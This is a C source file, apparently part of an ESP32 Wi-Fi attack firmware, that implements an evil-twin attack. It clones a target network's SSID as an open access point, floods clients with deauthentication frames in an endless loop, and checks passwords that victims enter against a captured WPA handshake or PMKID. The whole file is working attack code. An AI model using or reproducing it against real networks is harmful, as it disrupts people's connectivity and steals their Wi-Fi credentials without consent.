#include <string.h>
#include <esp_log.h>
#include "wifiMng.h"
#include "evil_twin.h"
#include "aircrack.h"
#include "sniffer.h"
#include "wifi_attacks.h"


#define EVIL_TWIN_TASK_PRIO 5

/* Store target information */
static const char *TAG = "EVIL_TWIN";
static TaskHandle_t evil_twin_task_handle = NULL;


static void evil_twin_task(void *pvParameters) 
{
    vTaskDelay(pdMS_TO_TICKS(1000));

    /* Get target information */
    target_info_t *target = target_get(TARGET_INFO_EVIL_TWIN);
    /*Try guess by ssid */
    target->vendor = getVendor((char *)&target->ssid);

    /* Clone Access Point */
    wifi_config_t wifi_config = {
        .ap = {
            .ssid = { 0 },
            .ssid_len = 0,
            .channel = target->channel,
            .password = "",
            .max_connection = 8,
            .authmode = WIFI_AUTH_OPEN,
            .pmf_cfg = {
                    /* Cannot set pmf to required when in wpa-wpa2 mixed mode! Setting pmf to optional mode. */
                    .required = false, 
                    .capable = true
            }
        },
    };
    strcpy((char *)&wifi_config.ap.ssid, (char *)&target->ssid);
    wifi_ap_clone(&wifi_config, NULL);
    /* Wait AP to be cloned */
    vTaskDelay(pdMS_TO_TICKS(2000));
    /* Start sniffer and beacon tracking */
    wifi_start_sniffing(target, SNIFF_MODE_ATTACK_EVIL_TWIN);
    wifi_start_beacon_tracking();
    
    while(true)
    {
        /* Spam softAP beacon from STA */
        //wifi_attack_softap_beacon_spam((target_info_t * )&target);
        /* Send deauth to clients */
        wifi_attack_deauth_basic(NULL, target->bssid, 7);
        vTaskDelay(pdMS_TO_TICKS(20));
        //wifi_attack_deauth_client_bad_msg1();
        wifi_attack_deauth_client_negative_tx_power(target->bssid, target->channel, (char *)&target->ssid);
        //wifi_attack_association_sleep();
        vTaskDelay(pdMS_TO_TICKS(100));
    }
}


void evil_twin_start_attack(const target_info_t *targe_info)
{
    if( evil_twin_task_handle != NULL )
    {   
        ESP_LOGE(TAG, "EvilTwin task already started.");
        return;
    }

    target_set(targe_info, TARGET_INFO_EVIL_TWIN);
    xTaskCreate(evil_twin_task, "evil_twin_task", 4096, NULL, EVIL_TWIN_TASK_PRIO, &evil_twin_task_handle);

    ESP_LOGI(TAG, "Evil-Twin attack started.");
    ESP_LOGI(TAG, "TARGET: %s on Channel %d.", target_get(TARGET_INFO_EVIL_TWIN)->ssid, target_get(TARGET_INFO_EVIL_TWIN)->channel);
}


void evil_twin_stop_attack(void)
{
    if (evil_twin_task_handle == NULL)
    {
        ESP_LOGE(TAG, "EvilTwin task is not running.");
        return;
    }
    /* Kill task */
    vTaskDelete(evil_twin_task_handle);
    evil_twin_task_handle = NULL;
    /* Stop sniffer and beacon tracking */
    wifi_stop_beacon_tracking();
    wifi_stop_sniffing();
    /* Wait engine stop */
    vTaskDelay(pdMS_TO_TICKS(1000));
    /* Restore original hotspot */
    wifi_start_softap();
    ESP_LOGI(TAG, "Evil-Twin attack stopped.");
}


bool evil_twin_check_password(char *password)
{
    const handshake_info_t *handshake = wifi_sniffer_get_handshake();
    const target_info_t target = *target_get(TARGET_INFO_EVIL_TWIN);

    if( handshake->handshake_captured)
    {
        return verify_password(password, (char *)&target.ssid, strlen((char *)&target.ssid), target.bssid, handshake->mac_sta, handshake->anonce, handshake->snonce, handshake->eapol, handshake->eapol_len, handshake->mic, handshake->key_decriptor_version);
    }
    if( handshake->pmkid_captured)
    {
        return verify_pmkid(password, (char *)&target.ssid, strlen((char *)&target.ssid), target.bssid, handshake->mac_sta, handshake->pmkid);
    }
    
    return false;
}